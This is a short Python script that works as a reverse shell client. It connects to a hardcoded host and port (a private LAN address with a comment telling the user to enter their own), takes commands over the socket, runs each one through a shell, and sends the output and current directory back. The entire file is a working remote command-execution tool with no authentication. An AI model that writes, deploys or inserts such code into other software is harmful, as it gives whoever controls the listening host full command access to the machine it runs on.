import os
import socket
import subprocess
import logging

# Create logging
logging.basicConfig(level=logging.INFO)
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

host = "192.168.43.164" #write the IP Address of your host computer
port = 9999

# Set logging application
logger = logging.getLogger('Client')
logger.info('Connecting to host:post - {}:{}'.format(host, port))

s = socket.socket()
s.connect((host, port))

logger.info('Connecting successfully!')

while True:
	data = s.recv(1024)
	logger.info('Command received:  %s' % data[:].decode("utf-8"))

	if data[:2].decode("utf-8") == "cd":
		os.chdir(data[3:].decode("utf-8"))
	if len(data)>0:
		cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		output_bytes = cmd.stdout.read() + cmd.stderr.read()
		output_str = str(output_bytes, "utf-8")
		logger.info('Command output: \n%s' % output_str)
		s.send(str.encode(output_str + str(os.getcwd()) + '>'))

s.close()
logger.info('Connection closed!')
